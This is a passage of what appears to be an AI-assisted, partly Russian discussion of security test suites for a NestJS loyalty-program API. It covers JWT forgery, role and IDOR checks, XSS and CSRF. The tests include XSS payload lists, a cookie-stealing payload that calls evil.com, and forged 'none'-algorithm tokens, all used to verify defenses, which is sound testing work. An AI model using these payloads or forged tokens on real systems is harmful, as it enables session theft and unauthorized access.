    expect(response.body.message).toContain('invalid');
    console.log('‚úÖ Token tampering detected and rejected');
  });

  // Test 4: Wrong Secret
  it('should reject token signed with wrong secret', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'ADMIN', tenantId: 'tenant-1' },
      'wrong-secret', // Wrong secret!
      { expiresIn: '1h' }
    );

    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${token}`)
      .expect(401);

    expect(response.body.message).toContain('invalid');
  });

  // Test 5: None Algorithm Attack
  it('should reject "none" algorithm JWT', async () => {
    // Create token with "none" algorithm (bypasses signature check)
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64');
    const payload = Buffer.from(JSON.stringify({
      userId: 'user-1',
      role: 'ADMIN',
      tenantId: 'tenant-1',
    })).toString('base64');

    const noneToken = `${header}.${payload}.`;

    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${noneToken}`)
      .expect(401);

    expect(response.body.message).toContain('invalid');
    console.log('‚úÖ "none" algorithm attack blocked');
  });

  // Test 6: Token Refresh (Rotation)
  it('should rotate refresh tokens on use', async () => {
    // Step 1: Login to get refresh token
    const loginResponse = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({
        phone: '+79991234567',
        password: 'test123',
      })
      .expect(200);

    const refreshToken1 = loginResponse.body.refreshToken;

    // Step 2: Use refresh token to get new access token
    const refreshResponse1 = await request(app.getHttpServer())
      .post('/api/v1/auth/refresh')
      .send({ refreshToken: refreshToken1 })
      .expect(200);

    const refreshToken2 = refreshResponse1.body.refreshToken;

    // Step 3: Verify new refresh token is different (rotation)
    expect(refreshToken2).not.toBe(refreshToken1);

    // Step 4: Old refresh token should be invalidated
    await request(app.getHttpServer())
      .post('/api/v1/auth/refresh')
      .send({ refreshToken: refreshToken1 })
      .expect(401);

    console.log('‚úÖ Refresh token rotation working');
  });

  // Test 7: Token Reuse Detection
  it('should detect token reuse (token theft)', async () => {
    const loginResponse = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({
        phone: '+79991234567',
        password: 'test123',
      })
      .expect(200);

    const refreshToken = loginResponse.body.refreshToken;

    // Use refresh token twice
    await request(app.getHttpServer())
      .post('/api/v1/auth/refresh')
      .send({ refreshToken })
      .expect(200);

    // Second use should fail (token reuse)
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/refresh')
      .send({ refreshToken })
      .expect(401);

    expect(response.body.message).toContain('reused');
    
    // Security action: invalidate all tokens for this user
    console.log('‚ö†Ô∏è Token reuse detected - all sessions invalidated');
  });

  // Test 8: JWT Claims Validation
  it('should validate required JWT claims', async () => {
    // Missing required claims
    const tokenNoUserId = jwt.sign(
      { role: 'GUEST', tenantId: 'tenant-1' }, // Missing userId
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${tokenNoUserId}`)
      .expect(401);

    const tokenNoRole = jwt.sign(
      { userId: 'user-1', tenantId: 'tenant-1' }, // Missing role
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${tokenNoRole}`)
      .expect(401);

    console.log('‚úÖ Required claims validated');
  });

  // Test 9: Token Issuer/Audience Validation
  it('should validate token issuer and audience', async () => {
    const tokenWrongIssuer = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET,
      { 
        expiresIn: '1h',
        issuer: 'wrong-issuer', // Wrong issuer
        audience: 'max-loyalty-api',
      }
    );

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${tokenWrongIssuer}`)
      .expect(401);

    console.log('‚úÖ Issuer/Audience validation working');
  });

  // Test 10: Token Blacklisting (Logout)
  it('should blacklist token on logout', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    // Token works before logout
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Logout
    await request(app.getHttpServer())
      .post('/api/v1/auth/logout')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Token should be blacklisted after logout
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(401);

    expect(response.body.message).toContain('blacklisted');
    console.log('‚úÖ Token blacklisting on logout working');
  });

  // Test 11: Short-lived Access Token + Long-lived Refresh Token
  it('should use different TTL for access and refresh tokens', async () => {
    const loginResponse = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .send({
        phone: '+79991234567',
        password: 'test123',
      })
      .expect(200);

    const accessToken = loginResponse.body.accessToken;
    const refreshToken = loginResponse.body.refreshToken;

    // Decode tokens to check expiration
    const accessDecoded = jwt.decode(accessToken) as any;
    const refreshDecoded = jwt.decode(refreshToken) as any;

    const accessTTL = accessDecoded.exp - accessDecoded.iat;
    const refreshTTL = refreshDecoded.exp - refreshDecoded.iat;

    console.log('=== Token TTL ===');
    console.log(`Access token: ${accessTTL / 60} minutes`);
    console.log(`Refresh token: ${refreshTTL / 60 / 60} hours`);

    // Access token: 15 min, Refresh token: 7 days
    expect(accessTTL).toBe(15 * 60); // 15 minutes
    expect(refreshTTL).toBe(7 * 24 * 60 * 60); // 7 days
  });

  // Test 12: Prevent JWT Confusion Attack (Algorithm Confusion)
  it('should prevent algorithm confusion attack', async () => {
    // Attack: Change HS256 to RS256 (use public key as secret)
    const publicKey = fs.readFileSync(path.join(__dirname, 'public.key'), 'utf8');

    try {
      // Attacker signs with RS256 using public key
      const maliciousToken = jwt.sign(
        { userId: 'user-1', role: 'ADMIN', tenantId: 'tenant-1' },
        publicKey,
        { algorithm: 'RS256' }
      );

      await request(app.getHttpServer())
        .get('/api/v1/admin/guests')
        .set('Authorization', `Bearer ${maliciousToken}`)
        .expect(401);

      console.log('‚úÖ Algorithm confusion attack blocked');
    } catch (error) {
      // Expected to fail
    }
  });
});
```


***

### **33. Authorization - role-based access?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** GUEST –Ω–µ –¥–æ–ª–∂–µ–Ω –≤–∏–¥–µ—Ç—å admin endpoints.

**–í–æ–ø—Ä–æ—Å:** Security tests?

- A) Test GUEST ‚Üí `/admin` ‚Üí 403 Forbidden
- B) Test MANAGER ‚Üí Owner-only endpoint ‚Üí 403
- C) B + test horizontal privilege escalation (Guest A ‚Üí Guest B data)
- D) C + test IDOR (Insecure Direct Object Reference)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Role-based authorization –∫—Ä–∏—Ç–∏—á–µ–Ω
- Horizontal privilege escalation = —á–∞—Å—Ç–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å
- IDOR = top OWASP vulnerability

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/security/authorization.security.spec.ts
describe('Authorization - Role-Based Access Control', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Guest Cannot Access Admin Endpoints
  it('should block GUEST from admin endpoints', async () => {
    const guestToken = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    const adminEndpoints = [
      '/api/v1/admin/guests',
      '/api/v1/admin/promos',
      '/api/v1/admin/reports',
      '/api/v1/admin/settings',
    ];

    for (const endpoint of adminEndpoints) {
      const response = await request(app.getHttpServer())
        .get(endpoint)
        .set('Authorization', `Bearer ${guestToken}`)
        .expect(403);

      expect(response.body.message).toContain('Forbidden');
    }

    console.log(`‚úÖ Blocked GUEST from ${adminEndpoints.length} admin endpoints`);
  });

  // Test 2: Manager Cannot Access Owner Endpoints
  it('should block MANAGER from owner-only endpoints', async () => {
    const managerToken = jwt.sign(
      { userId: 'manager-1', role: 'MANAGER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    const ownerEndpoints = [
      '/api/v1/admin/tenants/settings',
      '/api/v1/admin/billing',
      '/api/v1/admin/users/invite',
    ];

    for (const endpoint of ownerEndpoints) {
      await request(app.getHttpServer())
        .get(endpoint)
        .set('Authorization', `Bearer ${managerToken}`)
        .expect(403);
    }

    console.log('‚úÖ MANAGER blocked from owner-only endpoints');
  });

  // Test 3: Horizontal Privilege Escalation (Guest A ‚Üí Guest B)
  it('should prevent horizontal privilege escalation', async () => {
    const guestAToken = jwt.sign(
      { userId: 'user-a', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to access Guest B's data
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/profile/user-b') // Different user!
      .set('Authorization', `Bearer ${guestAToken}`)
      .expect(403);

    expect(response.body.message).toContain('not authorized');
    console.log('‚úÖ Horizontal privilege escalation blocked');
  });

  // Test 4: IDOR (Insecure Direct Object Reference)
  it('should prevent IDOR attacks', async () => {
    const guestAToken = jwt.sign(
      { userId: 'user-a', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to access another guest's transaction
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/transactions/tx-belongs-to-user-b') // Transaction belongs to user-b
      .set('Authorization', `Bearer ${guestAToken}`)
      .expect(403);

    expect(response.body.message).toContain('not authorized');
    console.log('‚úÖ IDOR attack blocked');
  });

  // Test 5: Tenant Isolation
  it('should isolate data between tenants', async () => {
    const tenant1Token = jwt.sign(
      { userId: 'admin-1', role: 'ADMIN', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to access tenant-2's data
    const response = await request(app.getHttpServer())
      .get('/api/v1/admin/guests?tenantId=tenant-2') // Different tenant!
      .set('Authorization', `Bearer ${tenant1Token}`)
      .expect(403);

    expect(response.body.message).toContain('not authorized');
    console.log('‚úÖ Tenant isolation working');
  });

  // Test 6: Privilege Escalation via Parameter Tampering
  it('should prevent privilege escalation via parameter tampering', async () => {
    const guestToken = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to set role=ADMIN in request body
    const response = await request(app.getHttpServer())
      .patch('/api/v1/guest/profile')
      .set('Authorization', `Bearer ${guestToken}`)
      .send({
        firstName: 'John',
        role: 'ADMIN', // ‚ùå Try to escalate privileges
      })
      .expect(200);

    // Verify role was NOT changed
    const user = await prisma.user.findUnique({ where: { id: 'user-1' } });
    expect(user.role).toBe('GUEST'); // Still GUEST

    console.log('‚úÖ Parameter tampering privilege escalation blocked');
  });

  // Test 7: Mass Assignment Vulnerability
  it('should prevent mass assignment attacks', async () => {
    const guestToken = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to modify protected fields
    await request(app.getHttpServer())
      .patch('/api/v1/guest/card')
      .set('Authorization', `Bearer ${guestToken}`)
      .send({
        totalBalance: 1000000, // ‚ùå Protected field
        totalEarned: 500000, // ‚ùå Protected field
      })
      .expect(400); // Bad Request

    console.log('‚úÖ Mass assignment blocked');
  });

  // Test 8: Role Hierarchy Enforcement
  it('should enforce role hierarchy', async () => {
    const roles = ['GUEST', 'MANAGER', 'ADMIN', 'OWNER'];

    for (let i = 0; i < roles.length; i++) {
      const currentRole = roles[i];
      const token = jwt.sign(
        { userId: `user-${i}`, role: currentRole, tenantId: 'tenant-1' },
        process.env.JWT_SECRET
      );

      // Check access to each level
      for (let j = 0; j < roles.length; j++) {
        const requiredRole = roles[j];
        const endpoint = `/api/v1/test/role/${requiredRole}`;

        const response = await request(app.getHttpServer())
          .get(endpoint)
          .set('Authorization', `Bearer ${token}`);

        if (i >= j) {
          // Current role >= required role ‚Üí should succeed
          expect(response.status).toBe(200);
        } else {
          // Current role < required role ‚Üí should fail
          expect(response.status).toBe(403);
        }
      }
    }

    console.log('‚úÖ Role hierarchy enforced');
  });

  // Test 9: Context-Based Authorization
  it('should apply context-based authorization', async () => {
    const guestToken = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Guest can view their own active card
    await request(app.getHttpServer())
      .get('/api/v1/guest/card')
      .set('Authorization', `Bearer ${guestToken}`)
      .expect(200);

    // Guest CANNOT delete their own card (business rule)
    await request(app.getHttpServer())
      .delete('/api/v1/guest/card')
      .set('Authorization', `Bearer ${guestToken}`)
      .expect(403);

    console.log('‚úÖ Context-based authorization working');
  });

  // Test 10: Automated Authorization Matrix Testing
  it('should test authorization matrix', async () => {
    const authMatrix = [
      // [role, endpoint, method, expectedStatus]
      ['GUEST', '/api/v1/guest/balance', 'GET', 200],
      ['GUEST', '/api/v1/admin/guests', 'GET', 403],
      ['MANAGER', '/api/v1/admin/guests', 'GET', 200],
      ['MANAGER', '/api/v1/admin/tenants/settings', 'GET', 403],
      ['ADMIN', '/api/v1/admin/tenants/settings', 'GET', 200],
      ['ADMIN', '/api/v1/admin/billing', 'GET', 403],
      ['OWNER', '/api/v1/admin/billing', 'GET', 200],
    ];

    for (const [role, endpoint, method, expectedStatus] of authMatrix) {
      const token = jwt.sign(
        { userId: `user-${role}`, role, tenantId: 'tenant-1' },
        process.env.JWT_SECRET
      );

      const response = await request(app.getHttpServer())
        [method.toLowerCase()](endpoint)
        .set('Authorization', `Bearer ${token}`);

      expect(response.status).toBe(expectedStatus);
    }

    console.log('‚úÖ Authorization matrix validated');
  });
});
```


***

–ü—Ä–æ–¥–æ–ª–∂–∞—é —Å –≤–æ–ø—Ä–æ—Å–∞–º–∏ **34-40** (–æ—Å—Ç–∞–ª—å–Ω—ã–µ Security Testing)? üöÄ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

### **34. XSS (Cross-Site Scripting) - input sanitization?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Guest –º–æ–∂–µ—Ç –≤–≤–µ—Å—Ç–∏ firstName –≤ profile.

**–í–æ–ø—Ä–æ—Å:** Security tests?

```
- A) Test basic XSS: `<script>alert('XSS')</script>`
```

- B) Test stored XSS (—Å–æ—Ö—Ä–∞–Ω–∏—Ç—å ‚Üí –æ—Ç–æ–±—Ä–∞–∑–∏—Ç—å ‚Üí execute?)
- C) B + test DOM-based XSS
- D) C + test XSS –≤ —Ä–∞–∑–Ω—ã—Ö –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞—Ö (HTML, JS, URL)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Stored XSS —Å–∞–º—ã–π –æ–ø–∞—Å–Ω—ã–π (persists –≤ DB)
- DOM-based XSS —á–∞—Å—Ç–æ –ø—Ä–æ–ø—É—Å–∫–∞—é—Ç
- XSS –≤ —Ä–∞–∑–Ω—ã—Ö –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞—Ö —Ç—Ä–µ–±—É–µ—Ç —Ä–∞–∑–Ω–æ–π sanitization

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/security/xss.security.spec.ts
describe('XSS (Cross-Site Scripting) Protection', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Basic XSS (Reflected)
  it('should sanitize basic XSS payloads', async () => {
    const token = generateGuestToken();

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
    ];

    for (const payload of xssPayloads) {
      const response = await request(app.getHttpServer())
        .patch('/api/v1/guest/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ firstName: payload })
        .expect(200);

      // Verify stored value is sanitized
      const user = await prisma.user.findUnique({
        where: { id: 'user-1' },
        include: { guestProfile: true },
      });

      expect(user.guestProfile.firstName).not.toContain('<script>');
      expect(user.guestProfile.firstName).not.toContain('onerror');
      expect(user.guestProfile.firstName).not.toContain('javascript:');
    }

    console.log(`‚úÖ Sanitized ${xssPayloads.length} XSS payloads`);
  });

  // Test 2: Stored XSS
  it('should prevent stored XSS attacks', async () => {
    const token = generateGuestToken();

    // Step 1: Store malicious payload
    const maliciousPayload = '<img src=x onerror="fetch(\'https://evil.com/?cookie=\'+document.cookie)">';

    await request(app.getHttpServer())
      .patch('/api/v1/guest/profile')
      .set('Authorization', `Bearer ${token}`)
      .send({ firstName: maliciousPayload })
      .expect(200);

    // Step 2: Retrieve data (should be sanitized)
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/profile')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    expect(response.body.firstName).not.toContain('onerror');
    expect(response.body.firstName).not.toContain('fetch');
    expect(response.body.firstName).not.toContain('<img');

    console.log('‚úÖ Stored XSS blocked');
  });

  // Test 3: DOM-based XSS (via URL parameters)
  it('should sanitize URL parameters', async () => {
    const maliciousParam = encodeURIComponent('<script>alert("XSS")</script>');

    const response = await request(app.getHttpServer())
      .get(`/api/v1/search?q=${maliciousParam}`)
      .expect(200);

    // Response should not contain unsanitized script
    expect(response.text).not.toContain('<script>');
    console.log('‚úÖ DOM-based XSS via URL blocked');
  });

  // Test 4: XSS in Different Contexts
  it('should sanitize XSS in HTML context', async () => {
    const token = generateGuestToken();

    const htmlPayloads = [
      '<b onmouseover=alert("XSS")>Bold</b>',
      '<a href="javascript:alert(\'XSS\')">Click</a>',
      '<div style="background-image: url(javascript:alert(\'XSS\'))">',
    ];

    for (const payload of htmlPayloads) {
      await request(app.getHttpServer())
        .patch('/api/v1/guest/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ firstName: payload })
        .expect(200);

      const user = await prisma.user.findUnique({
        where: { id: 'user-1' },
        include: { guestProfile: true },
      });

      expect(user.guestProfile.firstName).not.toContain('javascript:');
      expect(user.guestProfile.firstName).not.toContain('onmouseover');
    }

    console.log('‚úÖ HTML context XSS blocked');
  });

  // Test 5: XSS in JavaScript Context
  it('should sanitize XSS in JS context', async () => {
    const jsPayloads = [
      '"; alert("XSS"); //',
      '\'; alert("XSS"); //',
      '</script><script>alert("XSS")</script>',
    ];

    for (const payload of jsPayloads) {
      const response = await request(app.getHttpServer())
        .get(`/api/v1/guest/config?callback=${encodeURIComponent(payload)}`)
        .expect(200);

      expect(response.text).not.toContain('alert(');
    }

    console.log('‚úÖ JavaScript context XSS blocked');
  });

  // Test 6: XSS via File Upload
  it('should sanitize filenames for XSS', async () => {
    const token = generateAdminToken();

    const maliciousFilename = '<script>alert("XSS")</script>.csv';

    const filePath = path.join(__dirname, maliciousFilename);
    fs.writeFileSync(filePath, 'test,data\n1,2');

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(200);

    expect(response.body.filename).not.toContain('<script>');
    expect(response.body.filename).not.toContain('alert');

    fs.unlinkSync(filePath);
    console.log('‚úÖ Filename XSS blocked');
  });

  // Test 7: Mutation XSS (mXSS)
  it('should prevent mutation XSS attacks', async () => {
    const token = generateGuestToken();

    const mxssPayloads = [
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      '<listing>&lt;img src=x onerror=alert(1)&gt;</listing>',
      '<style><img src=x onerror=alert(1)></style>',
    ];

    for (const payload of mxssPayloads) {
      await request(app.getHttpServer())
        .patch('/api/v1/guest/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ firstName: payload })
        .expect(200);

      const user = await prisma.user.findUnique({
        where: { id: 'user-1' },
        include: { guestProfile: true },
      });

      expect(user.guestProfile.firstName).not.toContain('onerror');
    }

    console.log('‚úÖ Mutation XSS blocked');
  });

  // Test 8: Unicode XSS
  it('should block unicode XSS attacks', async () => {
    const token = generateGuestToken();

    const unicodePayloads = [
      '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
      '<script>alert\u0028"XSS"\u0029</script>',
      '\uFF1Cscript\uFF1Ealert("XSS")\uFF1C/script\uFF1E', // Fullwidth chars
    ];

    for (const payload of unicodePayloads) {
      await request(app.getHttpServer())
        .patch('/api/v1/guest/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ firstName: payload })
        .expect(200);

      const user = await prisma.user.findUnique({
        where: { id: 'user-1' },
        include: { guestProfile: true },
      });

      expect(user.guestProfile.firstName).not.toContain('script');
    }

    console.log('‚úÖ Unicode XSS blocked');
  });

  // Test 9: CSP (Content Security Policy) Headers
  it('should set CSP headers to prevent XSS', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['content-security-policy']).toBeDefined();
    expect(response.headers['content-security-policy']).toContain("script-src 'self'");
    expect(response.headers['content-security-policy']).toContain("object-src 'none'");

    console.log('‚úÖ CSP headers set correctly');
  });

  // Test 10: XSS Automated Scanning
  it('should scan for XSS vulnerabilities', async () => {
    const endpoints = [
      { path: '/api/v1/guest/profile', method: 'PATCH', param: 'firstName' },
      { path: '/api/v1/guest/profile', method: 'PATCH', param: 'lastName' },
      { path: '/api/v1/search', method: 'GET', param: 'q' },
    ];

    const xssPayloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      'javascript:alert(1)',
    ];

    let vulnerabilities = 0;

    for (const endpoint of endpoints) {
      for (const payload of xssPayloads) {
        const token = generateGuestToken();

        const response = endpoint.method === 'GET'
          ? await request(app.getHttpServer())
              .get(`${endpoint.path}?${endpoint.param}=${encodeURIComponent(payload)}`)
              .set('Authorization', `Bearer ${token}`)
          : await request(app.getHttpServer())
              .patch(endpoint.path)
              .set('Authorization', `Bearer ${token}`)
              .send({ [endpoint.param]: payload });

        // Check if payload appears unescaped in response
        if (
          response.text.includes(payload) ||
          response.text.includes('<script>') ||
          response.text.includes('onerror=')
        ) {
          vulnerabilities++;
          console.log(`‚ö†Ô∏è XSS vulnerability: ${endpoint.path} (${endpoint.param})`);
        }
      }
    }

    console.log(`=== XSS Scan Results ===`);
    console.log(`Endpoints tested: ${endpoints.length}`);
    console.log(`Payloads tested: ${xssPayloads.length}`);
    console.log(`Vulnerabilities found: ${vulnerabilities}`);

    expect(vulnerabilities).toBe(0);
  });
});

function generateGuestToken(): string {
  return jwt.sign(
    { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}

function generateAdminToken(): string {
  return jwt.sign(
    { userId: 'admin-1', role: 'ADMIN', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}
```


***

### **35. CSRF (Cross-Site Request Forgery) - token validation?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** State-changing –æ–ø–µ—Ä–∞—Ü–∏–∏ (POST, PATCH, DELETE).

**–í–æ–ø—Ä–æ—Å:** Security tests?

- A) Test POST request –±–µ–∑ CSRF token ‚Üí reject
- B) Test POST —Å invalid CSRF token ‚Üí reject
- C) Test POST —Å valid CSRF token ‚Üí success
- D) C + test double-submit cookie pattern

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- CSRF –∫—Ä–∏—Ç–∏—á–µ–Ω –¥–ª—è state-changing operations
- Invalid/missing token –¥–æ–ª–∂–µ–Ω –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å—Å—è
- Double-submit cookie = –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∑–∞—â–∏—Ç–∞

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/security/csrf.security.spec.ts
import * as csrf from 'csurf';

describe('CSRF (Cross-Site Request Forgery) Protection', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    
    // Enable CSRF protection
    app.use(csrf({ cookie: true }));
    
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: GET request without CSRF token (should work)
  it('should allow GET requests without CSRF token', async () => {
    const token = generateGuestToken();

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    console.log('‚úÖ GET request allowed without CSRF token');
  });

  // Test 2: POST request without CSRF token (should fail)
  it('should reject POST without CSRF token', async () => {
    const token = generateGuestToken();

    const response = await request(app.getHttpServer())
      .post('/api/v1/guest/redeem')
      .set('Authorization', `Bearer ${token}`)
      .send({ amount: 100 })
      .expect(403);

    expect(response.body.message).toContain('CSRF');
    console.log('‚úÖ POST without CSRF token rejected');
  });

  // Test 3: POST with invalid CSRF token
  it('should reject POST with invalid CSRF token', async () => {
    const token = generateGuestToken();

    const response = await request(app.getHttpServer())
      .post('/api/v1/guest/redeem')
      .set('Authorization', `Bearer ${token}`)
      .set('X-CSRF-Token', 'invalid-token')
      .send({ amount: 100 })
      .expect(403);

    expect(response.body.message).toContain('CSRF');
    console.log('‚úÖ Invalid CSRF token rejected');
  });

  // Test 4: POST with valid CSRF token (should work)
  it('should allow POST with valid CSRF token', async () => {
    const token = generateGuestToken();

    // Step 1: Get CSRF token
    const csrfResponse = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const csrfToken = csrfResponse.body.csrfToken;
    const cookies = csrfResponse.headers['set-cookie'];

    // Step 2: Use CSRF token in POST request
    await request(app.getHttpServer())
      .post('/api/v1/guest/redeem')
      .set('Authorization', `Bearer ${token}`)
      .set('X-CSRF-Token', csrfToken)
      .set('Cookie', cookies)
      .send({ amount: 100 })
      .expect(200);

    console.log('‚úÖ Valid CSRF token accepted');
  });

  // Test 5: CSRF token reuse (should fail after logout)
  it('should invalidate CSRF token on logout', async () => {
    const token = generateGuestToken();

    // Get CSRF token
    const csrfResponse = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const csrfToken = csrfResponse.body.csrfToken;
    const cookies = csrfResponse.headers['set-cookie'];

    // Logout
    await request(app.getHttpServer())
      .post('/api/v1/auth/logout')
      .set('Authorization', `Bearer ${token}`)
      .set('X-CSRF-Token', csrfToken)
      .set('Cookie', cookies)
      .expect(200);

    // Try to reuse CSRF token (should fail)
    const newToken = generateGuestToken();

    await request(app.getHttpServer())
      .post('/api/v1/guest/redeem')
      .set('Authorization', `Bearer ${newToken}`)
      .set('X-CSRF-Token', csrfToken)
      .set('Cookie', cookies)
      .expect(403);

    console.log('‚úÖ CSRF token invalidated on logout');
  });

  // Test 6: Double-Submit Cookie Pattern
  it('should validate double-submit cookie', async () => {
    const token = generateGuestToken();

    // Get CSRF token (stored in cookie AND returned in response)
    const csrfResponse = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const csrfToken = csrfResponse.body.csrfToken;
    const cookies = csrfResponse.headers['set-cookie'];

    // Extract CSRF from cookie
    const csrfCookie = cookies.find((c: string) => c.startsWith('XSRF-TOKEN='));
    const csrfFromCookie = csrfCookie.split('=')[1].split(';')[0];

    // Verify token in response matches cookie
    expect(csrfToken).toBe(decodeURIComponent(csrfFromCookie));

    console.log('‚úÖ Double-submit cookie pattern validated');
  });

  // Test 7: CSRF token per-session
  it('should generate unique CSRF token per session', async () => {
    const token1 = generateGuestToken();
    const token2 = generateGuestToken();

    const csrf1 = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token1}`)
      .expect(200);

    const csrf2 = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token2}`)
      .expect(200);

    expect(csrf1.body.csrfToken).not.toBe(csrf2.body.csrfToken);
    console.log('‚úÖ Unique CSRF token per session');
  });

  // Test 8: CSRF protection on all state-changing methods
  it('should protect POST, PATCH, PUT, DELETE', async () => {
    const token = generateGuestToken();
    const methods = ['POST', 'PATCH', 'PUT', 'DELETE'];

    for (const method of methods) {
      const response = await request(app.getHttpServer())
        [method.toLowerCase()]('/api/v1/guest/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ firstName: 'Test' })
        .expect(403);

      expect(response.body.message).toContain('CSRF');
    }

    console.log('‚úÖ CSRF protection on all state-changing methods');
  });

  // Test 9: CSRF exemption for API tokens (machine-to-machine)
  it('should exempt API tokens from CSRF protection', async () => {
    const apiToken = generateApiToken(); // Machine-to-machine token

    // API tokens should bypass CSRF (not browser-based)
    await request(app.getHttpServer())
      .post('/api/v1/webhooks/transaction')
      .set('Authorization', `Bearer ${apiToken}`)
      .send({
        posCheckId: 'CHK-123',
        checkAmount: 1000,
        guestPhone: '+79991234567',
      })
      .expect(200); // No CSRF token required

    console.log('‚úÖ API tokens exempt from CSRF protection');
  });

  // Test 10: SameSite Cookie Attribute
  it('should set SameSite cookie attribute', async () => {
    const token = generateGuestToken();

    const response = await request(app.getHttpServer())
      .get('/api/v1/csrf-token')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    const cookies = response.headers['set-cookie'];
